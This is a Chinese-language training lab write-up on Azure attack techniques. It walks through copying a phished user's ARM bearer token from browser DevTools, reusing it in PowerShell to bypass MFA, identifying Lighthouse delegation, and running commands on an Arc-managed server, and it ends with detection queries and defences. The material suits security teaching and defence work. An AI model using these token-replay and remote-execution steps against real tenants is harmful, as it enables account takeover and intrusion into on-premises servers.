# Learning Objective 16：利用 Azure Lighthouse 与 Azure Arc 进行远程命令执行

> **概述**：本实验是攻击链条中的关键转折点，从 Web 会话（SaaS）向基础设施（IaaS/Hybrid）的转移。你将利用通过钓鱼获取的 Adam 的 Web 会话，提取 Token 并转移到 PowerShell 环境，发现目标使用 Azure Lighthouse 管理混合云资源（Azure Arc），最终通过云端控制面在服务器上执行命令。

---

## 目录

1. [学习目标](#学习目标)
2. [理论基础](#理论基础)
3. [实验环境与前提条件](#实验环境与前提条件)
4. [技术原理](#技术原理)
5. [实验步骤](#实验步骤)
6. [检测与防御](#检测与防御)
7. [参考资料](#参考资料)

---

## 学习目标

### 核心目标

1. **Token 提取与转移**：从浏览器（Adam 的会话）中提取 ARM (Azure Resource Manager) 的 Access Token，并在本地 PowerShell 中复用，实现从 GUI 到 CLI 的环境切换。

2. **识别架构**：枚举资源，发现目标使用了 **Azure Lighthouse**（跨租户管理）和 **Azure Arc**（混合云管理）。

3. **远程执行**：滥用 `Azure Arc VMware VM Contributor` 角色权限，通过云端 API 向被纳管的本地服务器 `FF-Machine` 发送命令，确认其运行着 SQL Server。

### 预期成果

- 成功从浏览器提取 Access Token 并在 PowerShell 中复用
- 识别出 Azure Lighthouse 跨租户管理架构
- 发现 Azure Arc 纳管的混合云服务器
- 在本地服务器上远程执行命令

---

## 理论基础

### Token Replay Attacks（令牌重放攻击）

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md)（第 74-88 行）

不同类型的令牌在云身份验证中起着至关重要的作用：

- **Access Token**：用于访问受保护资源的凭据，包含权限声明
- **Session Cookie**：在用户成功认证后由身份验证服务颁发
- **特点**：Token 中已包含 MFA 声明，因此重放 Token 可以绕过 MFA 要求
- **攻击链**：窃取 Token → 重放 Token → 访问受害者账户

**关键引用**（[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md) 第 78-79 行）：
> Token theft occurs when an adversary gets access and compromises tokens. Once stolen, the adversary can replay stolen tokens and access the compromised account. In AiTM scenario, the adversary can bypass MFA requirement, because the MFA claims are already included in the token.

### Azure Lighthouse（灯塔）架构

> **资料来源**：[Microsoft Learn - What is Azure Lighthouse?](https://learn.microsoft.com/en-us/azure/lighthouse/overview)

**Azure Lighthouse** 是一种跨租户管理服务，允许服务提供商（MSP）或大企业的 IT 部门管理多个客户/子公司的订阅。

**核心概念**：
- **管理租户（Managing Tenant）**：提供服务管理的一方
- **客户租户（Customer Tenant）**：接受服务管理的一方
- **委派管理（Delegated Management）**：将资源管理权限委派给外部租户

**技术特征**：
- 订阅上会出现 `ManagedByTenantIds` 属性
- 资源在管理租户的 Azure 门户中显示为"托管"资源
- 用户使用自己的凭据访问跨租户资源

### Azure Arc（混合云管理）

> **资料来源**：[Microsoft Learn - Azure Arc overview](https://learn.microsoft.com/en-us/azure/azure-arc/overview)

**Azure Arc** 将 Azure 的管理和服务扩展到任何基础设施（本地、边缘、多云）。

**核心组件**：
- **Azure Arc-enabled Servers**：将 Windows 和 Linux 服务器连接到 Azure
- **Azure Arc Agent**：安装在本地服务器上的代理程序
- **Run Command 功能**：通过云端 API 在服务器上执行命令

**技术特征**：
- 资源类型：`Microsoft.HybridCompute/machines`
- 通过出站连接与 Azure 通信（绕过入站防火墙）
- 支持远程命令执行、扩展管理、配置管理

### MITRE ATT&CK 映射

本实验涵盖以下 MITRE ATT&CK 技术点：

| TTP | 描述 | 相关性 |
|-----|------|--------|
| **T1078.004** | Valid Accounts: Cloud Accounts | 使用被盗的云账户凭据 |
| **T1552** | Unsecured Credentials | 从浏览器提取凭据 |
| **T1136.003** | Create Account: Cloud Account | 创建云账户 |
| **T1059.001** | Command and Scripting: PowerShell | 使用 PowerShell 执行命令 |
| **T1203** | Exploitation for Client Execution | 利用客户端执行漏洞 |

---

## 实验环境与前提条件

### 软件与工具

| 工具 | 版本要求 | 用途 | 下载/参考 |
|------|----------|------|-----------|
| **PowerShell** | 5.1+ | Azure 管理 | 系统自带 |
| **Az PowerShell Module** | 最新版 | Azure Resource Manager 管理 | [Install Az Module](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) |
| **Az.ConnectedMachine Module** | 最新版 | Azure Arc 服务器管理 | [Install Az.ConnectedMachine](https://learn.microsoft.com/en-us/powershell/module/az.connectedmachine/) |
| **Chrome DevTools** | 现代浏览器 | Token 提取 | 系统自带 |

### 网络与权限条件

| 条件 | 为什么需要 | 配置说明 |
|------|------------|----------|
| **浏览器会话** | 需要已登录的 Adam 会话 | 来自 Objective 15 的 AiTM 攻击 |
| **PowerShell 环境** | 需要执行 Azure 管理命令 | 支持脚本执行 |
| **Azure 访问权限** | 需要 Adam 的有效 Token | 通过 AiTM 攻击获取 |

### 为什么需要这些条件？

1. **浏览器会话**：
   - Objective 15 中通过 Evilginx 成功窃取了 Adam 的会话 Cookie
   - Cookie 中包含 Access Token，可用于后续操作
   - 这是整个攻击链条的起点

2. **PowerShell 环境**：
   - 提供自动化管理 Azure 资源的能力
   - 支持模块化操作（Az, Az.ConnectedMachine）
   - 便于批量操作和后续渗透

3. **Azure 访问权限**：
   - Adam 的账户具有 `Azure Arc VMware VM Contributor` 角色
   - 该角色允许在 Arc 机器上执行操作
   - 这是在混合云环境中横向移动的关键

### 实验目标环境配置（漏洞场景）

| 配置项 | 状态 | 为什么形成漏洞 |
|--------|------|----------------|
| **Azure Lighthouse** | **已启用** | 跨租户管理扩大了攻击面 |
| **Azure Arc** | **已部署** | 允许远程管理本地服务器 |
| **Adam 角色权限** | **Contributor** | 允许执行 Run Command |
| **混合云架构** | **本地+云端** | 突破了传统网络边界 |

---

## 技术原理

### 原理 A：Access Token 的通用性

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md) + [target15.md](./target15.md)

**机制说明**：
1. 我们在 Objective 15 中通过 Cookie 劫持了 Adam 的浏览器会话
2. 浏览器在访问 Azure 门户时，后台会向 `management.azure.com` 发送带有 Bearer Token 的请求
3. 这个 Token 只要没过期，拿出来放在 PowerShell 里一样能用
4. 这让我们从"只能点点鼠标"变成了"可以写脚本批量操作"

**技术细节**：
```
HTTP Header: Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGc...
├─ JWT 格式
├─ 包含用户身份声明
├─ 包含权限范围
└─ 包含 MFA 声明（已通过）
```

**类比理解**：
- **浏览器** = 钱包（保存 Token）
- **Token** = 门禁卡（证明身份）
- **PowerShell** = 也能用这张门禁卡的另一扇门

### 原理 B：Azure Lighthouse（跨租户管理）

> **资料来源**：[Microsoft Learn - Azure Lighthouse](https://learn.microsoft.com/en-us/azure/lighthouse/overview)

**核心概念**：
Azure Lighthouse 允许服务提供商管理多个客户的 Azure 订阅，就像管理自己的资源一样。

**攻击价值**：
1. **扩大攻击面**：从一个租户可以访问多个租户的资源
2. **隐蔽性**：活动记录在管理租户中，客户租户可能不易察觉
3. **权限放大**：可能拥有跨租户的管理权限

**识别方法**：
```powershell
Get-AzSubscription | fl *
# 关键字段：
# - ManagedByTenantIds: 不为空表示被托管
# - HomeTenantId: 与 TenantId 不同
```

**类比（物业管理）**：
- **正常情况**：你自己打扫自家房子
- **Lighthouse**：你把备用钥匙给了物业公司，物业的保洁员用他自己的工牌就能进你家打扫

### 原理 C：Azure Arc Run Command（混合云控制面）

> **资料来源**：[Microsoft Learn - Run scripts on Azure Arc-enabled servers](https://learn.microsoft.com/en-us/azure/azure-arc/servers/run-command)

**核心机制**：
Azure Arc 允许通过云端 API 向本地服务器发送命令，Arc 代理在本地执行并返回结果。

**攻击价值**：
1. **绕过防火墙**：使用出站连接，不需要入站访问
2. **突破网络边界**：从云端控制本地服务器
3. **持久化**：只要 Arc 代理运行，就能持续执行命令

**技术实现**：
```powershell
# 对普通 Azure VM 使用：
Invoke-AzVMRunCommand -ResourceGroupName ... -VMName ... -CommandId 'RunPowerShellScript' -ScriptPath ...

# 对 Arc 机器使用：
New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName '...' -RunCommandName '...' -SourceScript "..."
```

**类比（提线木偶）**：
- **本地服务器** = 地下室里的木偶
- **Azure Arc** = 连在木偶上的隐形线
- **云端 API** = 你在云端扯线的手
- **防火墙** = 地下室的门（通常只出不进，但线可以穿门而过）

---

## 实验步骤

### 步骤 1：从浏览器提取 Token (Extraction)

**目的**：将浏览器中的 Adam 的会话 Token 转化为 PowerShell 可用的格式。

**为什么需要这一步？**
- 浏览器 Cookie 无法直接在 PowerShell 中使用
- 需要提取 Bearer Token 才能通过 Azure API 进行操作
- 这是从 GUI 操作转向 CLI 自动化的关键转折

**前置条件**：
- 已通过 [target15.md](./target15.md) 的 AiTM 攻击获取 Adam 的会话
- 浏览器已登录 Adam 账号到 Azure 门户

#### 实施步骤

**1. 打开浏览器开发者工具**

在已登录 Adam 账号的浏览器中：
- 按 `F12` 打开开发者工具
- 切换到 **Network (网络)** 标签页
- 勾选 **Preserve log (保留日志)**

**2. 触发 API 请求**

点击 Azure 门户中的 "All Resources" 或任何会触发资源列表的操作。

**3. 提取 Token**

在网络请求列表中：
1. 搜索 `api-version` 或 `management.azure.com`
2. 找到任意发往 `management.azure.com` 的请求
3. 查看 **Request Headers**
4. 复制 `Authorization` 字段中 `Bearer ` 之后的一长串字符

**预期结果**：
```
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaHGJz...
                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                        这是需要复制的 Token 部分
```

**验证要点**：
- Token 是一长串 Base64 编码的字符串
- 通常包含多个用 `.` 分隔的部分（JWT 格式）
- 长度约为 1000-2000 个字符

### 步骤 2：建立 PowerShell 连接 (Pivot)

**目的**：使用提取的 Token 在 PowerShell 中建立 Azure 连接。

**为什么需要这一步？**
- 将 Web 会话转化为 CLI 会话
- 获得批量操作能力
- 为后续自动化渗透铺平道路

#### 实施步骤

**1. 打开 PowerShell**

```powershell
# 导入必要的模块
Import-Module Az
Import-Module Az.ConnectedMachine
```

**2. 使用 Token 连接**

```powershell
# 粘贴步骤 1 中复制的 Token
$accessToken = "eyJ0eXAiOiJKV1QiLCJhbGc..."

# 使用 Token 连接
Connect-AzAccount -AccessToken $accessToken -AccountId 'adamjelder@yourdomain.com'
```

**3. 验证连接**

```powershell
# 查看当前上下文
Get-AzContext

# 预期输出应显示：
# - Account: adamjelder@yourdomain.com
# - Subscription: [订阅名称]
# - Tenant: [租户 ID]
```

**预期结果**：
```
Account           : adamjelder@yourdomain.com
Subscription      : [订阅名称]
Tenant            : [租户 ID]
Environment       : AzureCloud
```

**验证要点**：
- 账户显示为 Adam 的账户
- 可以访问至少一个订阅
- 没有 MFA 提示（Token 已包含 MFA 声明）

### 步骤 3：枚举资源与识别架构 (Enumeration)

**目的**：了解 Adam 能访问什么资源，以及这些资源的性质。

**为什么需要这一步？**
- 信息收集是攻击的关键阶段
- 识别 Azure Lighthouse 架构
- 发现 Azure Arc 纳管的混合云服务器
- 确定攻击路径

#### 3.1 查看可访问资源

```powershell
# 列出所有资源
Get-AzResource

# 预期发现：
# - 资源类型为 Microsoft.HybridCompute/machines (Arc 机器)
# - 资源类型为 Microsoft.AzureArcData/SqlServerInstances
# - 机器名为 ff-machine
```

**预期输出示例**：
```
Name    : ff-machine
Type    : Microsoft.HybridCompute/machines
Location: eastus
```

#### 3.2 识别 Azure Lighthouse

```powershell
# 查看订阅详细信息
Get-AzSubscription | fl *

# 关键字段：
# - ManagedByTenantIds: 包含值表示通过 Lighthouse 托管
# - HomeTenantId: 与当前 TenantId 不同
```

**预期输出示例**：
```
Name               : [订阅名称]
Id                 : [订阅 ID]
TenantId           : [当前租户 ID]
HomeTenantId       : [主租户 ID - 不同]
ManagedByTenantIds : {[管理租户 ID]}
```

**验证要点**：
- `HomeTenantId` 与 `TenantId` 不同
- `ManagedByTenantIds` 不为空
- 这确认了是通过 Lighthouse 托管的资源

#### 3.3 查看权限分配

```powershell
# 查看角色分配
Get-AzRoleAssignment

# 寻找关键角色：
# - Azure Arc VMware VM Contributor
# - Contributor
# - Owner
```

**预期输出示例**：
```
RoleDefinitionName             : Azure Arc VMware VM Contributor
SignInName                      : adamjelder@yourdomain.com
Scope                           : [资源组范围]
```

**验证要点**：
- Adam 拥有 `Azure Arc VMware VM Contributor` 角色
- 该角色允许在 Arc 机器上执行操作
- 确认可以在目标机器上运行命令

### 步骤 4：远程执行命令 (Execution)

**目的**：利用 Azure Arc 的 Run Command 功能，在目标服务器上执行命令。

**为什么需要这一步？**
- 验证对混合云服务器的控制能力
- 收集目标服务器信息
- 为后续攻击（如数据窃取）铺平道路

#### 4.1 技术注意事项

**重要区别**：
- **普通 Azure VM**：使用 `Invoke-AzVMRunCommand`
- **Arc 机器**：必须使用 `New-AzConnectedMachineRunCommand`

这是初学者容易混淆的地方，使用错误的命令会失败。

#### 4.2 执行探测命令

**目标**：检查是否运行了 SQL Server 服务。

```powershell
# 使用 Az.ConnectedMachine 模块
New-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'SQLQueryX' `
    -Location 'East US' `
    -SourceScript "net start | Select-String 'SQL'"
```

**参数说明**：
- `MachineName`: Arc 机器名称
- `ResourceGroupName`: 资源组名称
- `RunCommandName`: 任意名称，用于标识这次操作
- `Location`: Azure 区域
- `SourceScript`: 要执行的 PowerShell 脚本

#### 4.3 等待执行完成

Azure Arc 的命令执行是异步的，可能需要几分钟。

```powershell
# 检查命令执行状态
Get-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'SQLQueryX'
```

#### 4.4 查看执行结果

```powershell
# 获取详细输出
$command = Get-AzConnectedMachineRunCommand `
    -MachineName 'ff-machine' `
    -ResourceGroupName 'FFDBMachineRG' `
    -RunCommandName 'SQLQueryX'

# 查看输出
$command.InstanceViewOutput
```

**预期结果**：
```
InstanceViewOutput :
These Windows services are started:

 SQL Server (MSSQLSERVER)
 SQL Server Agent (MSSQLSERVER)
 SQL Server Analysis Services (MSSQLSERVER)
```

**验证要点**：
- 命令成功执行
- 确认了 SQL Server 正在运行
- 证明了 `ff-machine` 是一台数据库服务器

#### 4.5 后续攻击思路

发现 SQL Server 后，可能的攻击路径：
1. 数据库凭据窃取
2. 敏感数据导出
3. 数据库破坏
4. 持久化后门

这将在后续目标中继续。

---

## 检测与防御

### 检测方法

> **资料来源**：[IdentitySecurityMonitoring.md](./IdentitySecurityMonitoring.md) + [queries/AiTM/SearchCookies.kql](./queries/AiTM/SearchCookies.kql)

#### 1. 异常登录检测

**检测点**：
- Token 重放检测
- 异常地理位置登录
- 异常时间登录

**KQL 查询示例**：
```kql
// 检测异常的 Azure Arc Run Command 活动
AzureActivity
| where OperationNameValue contains "Microsoft.HybridCompute/machines/runCommands/write"
| where TimeGenerated > ago(1h)
| project TimeGenerated, Caller, CallerIpAddress, OperationNameValue, ResourceGroupName
| order by TimeGenerated desc
```

#### 2. 跨租户活动监控

**检测点**：
- Lighthouse 相关的活动
- 跨租户的资源访问

**KQL 查询示例**：
```kql
// 检测 Azure Lighthouse 相关的活动
AzureActivity
| where OperationNameValue contains "Microsoft.Management/managedByTenants"
| project TimeGenerated, Caller, OperationNameValue, Properties
```

#### 3. Arc 机器异常命令执行

**检测点**：
- 非正常时间的 Run Command
- 非授权账户的命令执行
- 可疑的命令内容

**检测规则**：
- 监控 `Microsoft.HybridCompute/machines/runCommands/write` 操作
- 基线正常管理员行为
- 设置异常行为警报

### 防御措施

> **资料来源**：[config/AadSecConfig.json](./config/AadSecConfig.json)

#### 1. 限制 Azure Lighthouse 访问

**推荐配置**：
- 审查所有 Lighthouse 委派
- 仅允许必要的管理租户
- 定期审查访问权限

#### 2. 最小权限原则

**推荐配置**：
- 避免分配过宽的权限（如 Owner、Contributor）
- 使用细粒度的角色定义
- 定期审查角色分配

**配置参考**：
- `Azure Arc VMware VM Contributor` 应仅分配给必要人员
- 考虑使用自定义角色替代内置角色

#### 3. 条件访问策略

**推荐策略**：

| 策略设置 | 推荐值 | 理由 |
|----------|--------|------|
| **设备要求** | 合规设备或混合加入设备 | 防止 Token 重放 |
| **认证强度** | 防钓鱼 MFA (FIDO2/CBA) | 无法被中间人拦截 |
| **会话管理** | 签名频率：每次 | 强制重新认证 |
| **网络位置** | 合规网络 (GSA) | 限制访问来源 |

#### 4. 监控和审计

**推荐配置**：
- 启用 Azure Activity Logs
- 配置 Log Analytics 工作区
- 设置警报规则

#### 5. Azure Arc 安全最佳实践

**推荐配置**：
- 限制 Arc 代理的权限
- 定期更新 Arc 代理
- 监控 Arc 连接状态
- 使用 Just-In-Time 访问

---

## 实验总结

### 攻击链条回顾

```
┌─────────────────────────────────────────────────────────────────┐
│                        完整攻击链                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. 会话劫持（[target15.md](./target15.md)）                    │
│     ├─ Evilginx 中间人攻击                                      │
│     ├─ 窃取 Adam 的 Session Cookie                             │
│     └─ Cookie 包含 MFA 声明                                     │
│                                                                  │
│  2. Token 提取与转移                                            │
│     ├─ 从浏览器开发者工具提取 ARM Token                        │
│     ├─ 在 PowerShell 中使用 Token 连接                         │
│     └─ 绕过 MFA（Token 已包含 MFA 声明）                        │
│                                                                  │
│  3. 架构识别                                                    │
│     ├─ 发现 Azure Lighthouse（跨租户管理）                     │
│     ├─ 发现 Azure Arc（混合云管理）                            │
│     └─ 确认 Adam 的权限（Contributor）                         │
│                                                                  │
│  4. 远程命令执行                                                │
│     ├─ 使用 Azure Arc Run Command                              │
│     ├─ 在 ff-machine 上执行命令                                │
│     └─ 确认 SQL Server 正在运行                                │
│                                                                  │
│  5. 攻击效果                                                    │
│     ├─ 突破网络边界（云端控制本地）                            │
│     ├─ 获得数据库服务器访问                                    │
│     └─ 为后续数据窃取铺平道路                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 关键收获

1. **Token 的威力**：窃取的 Token 可以在不同环境（浏览器、PowerShell）中重用
2. **Lighthouse 的风险**：跨租户管理扩大了攻击面，需要严格监控
3. **Arc 的双刃剑**：虽然方便管理，但也提供了从云端攻击本地的途径
4. **网络边界的消失**：混合云架构使传统网络防御策略失效

### 技术要点

- **Token 格式**：JWT (JSON Web Token)，包含 Header、Payload、Signature 三部分
- **Token 生命周期**：通常 1 小时有效，可通过 Refresh Token 续期
- **Arc 通信**：使用出站 HTTPS 连接（443 端口），绕过入站防火墙
- **权限模型**：Azure RBAC（基于角色的访问控制）

---

## 参考资料

### 项目内部文档

| 资料名称 | 文件路径 | 说明 |
|----------|----------|------|
| **前置攻击（Objective 15）** | [target15.md](./target15.md) | SMTP 协议滥用与 Evilginx 中间人钓鱼 |
| **AiTM 攻击理论基础** | [Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md) | 完整的 AiTM 攻击理论框架（第 74-88 行关于 Token） |
| **身份安全监控** | [IdentitySecurityMonitoring.md](./IdentitySecurityMonitoring.md) | 检测方法和防御策略 |
| **安全配置参考** | [config/AadSecConfig.json](./config/AadSecConfig.json) | Entra ID 安全配置基线 |
| **项目主文档** | [README.md](./README.md) | 项目整体结构说明 |

### 检测查询文件

| 资料名称 | 文件路径 | 说明 |
|----------|----------|------|
| **Cookie 搜索查询** | [queries/AiTM/SearchCookies.kql](./queries/AiTM/SearchCookies.kql) | OfficeHome Cookie 跨国家检测（DART 团队） |
| **Token 关联函数** | [queries/AiTM/Functions/Token_EntityToAlertSession.func](./queries/AiTM/Functions/Token_EntityToAlertSession.func) | Token 与警报关联 |
| **会话活动关联** | [queries/AiTM/Functions/Token_SessionIdToXdrActivities.func](./queries/AiTM/Functions/Token_SessionIdToXdrActivities.func) | SessionId 与 XDR 活动关联 |

### 官方参考资料

| 主题 | 链接 | 说明 |
|------|------|------|
| **Azure Lighthouse** | [What is Azure Lighthouse?](https://learn.microsoft.com/en-us/azure/lighthouse/overview) | 跨租户管理原理 |
| **Azure Arc** | [Azure Arc overview](https://learn.microsoft.com/en-us/azure/azure-arc/overview) | 混合云管理概述 |
| **Arc Run Command** | [Run scripts on Azure Arc-enabled servers](https://learn.microsoft.com/en-us/azure/azure-arc/servers/run-command) | 命令执行机制 |
| **Azure PowerShell** | [Install Az PowerShell module](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) | PowerShell 管理 |
| **Azure RBAC** | [Azure role-based access control](https://learn.microsoft.com/en-us/azure/role-based-access-control/overview) | 权限模型 |
| **Entra ID 安全令牌** | [Entra ID Security Tokens](https://learn.microsoft.com/en-us/entra/identity-platform/security-tokens) | 令牌技术文档 |

### 社区资源

| 资源 | 链接 |
|------|------|
| **Azure Hacking** | [Azure Hacking GitHub](https://github.com/hausec/Azure-Hacking) |
| **Arc Security** | [Securing Azure Arc](https://techcommunity.microsoft.com/t5/azure-arc-blog/securing-azure-arc-enabled-servers/ba-p/3715252) |
| **Lighthouse Best Practices** | [Azure Lighthouse best practices](https://learn.microsoft.com/en-us/azure/lighthouse/best-practices) |

---

*文档版本：基于 AzureAD-Attack-Defense-frame 项目生成*
*更新日期：2025-01*
*相关文档：target15.md, Adversary-in-the-Middle.md, IdentitySecurityMonitoring.md*
